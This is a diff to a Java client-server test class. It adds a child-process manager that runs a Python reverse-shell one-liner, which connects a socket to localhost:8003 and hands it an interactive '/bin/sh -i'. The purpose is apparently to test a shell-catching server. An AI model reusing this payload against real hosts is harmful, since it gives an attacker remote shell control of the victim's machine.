@@ -66,7 +66,7 @@ public class ClientServerTest {
 	
 	public static class ChildManager implements Runnable {
 		private String clientStartArgs;
-		private Process process = null;
+		protected Process process = null;
 			
 		public ChildManager(String clientStartArgs) {
 			this.clientStartArgs = clientStartArgs;
@@ -103,6 +103,35 @@ public class ClientServerTest {
 				return true;
 			}
 		}
+	}
+	
+	public static class PythonChildManager extends ChildManager{
+
+		public PythonChildManager() {
+			super("");
+		}
+		
+		@Override
+		public void run(){
+			String[] command = {"python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"localhost\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);"};
+			
+			try {
+				process = Runtime.getRuntime().exec(command);
+				process.waitFor();
+				//System.out.println(new String(process.getErrorStream().readAllBytes()));
+				//System.out.println(new String(process.getInputStream().readAllBytes()));
+			} catch (IOException | InterruptedException e) {
+				e.printStackTrace();
+			}
+
+		}
+	}
+	
+	protected static void spawnPythonOneliner() {
+		PythonChildManager pcm = new PythonChildManager();
+		service.submit(pcm);
+		childManagers.add(pcm);
+		Time.sleepWrapped(3000);
 	}
 	
 	protected static void spawnClient(String clientStartArgs) {
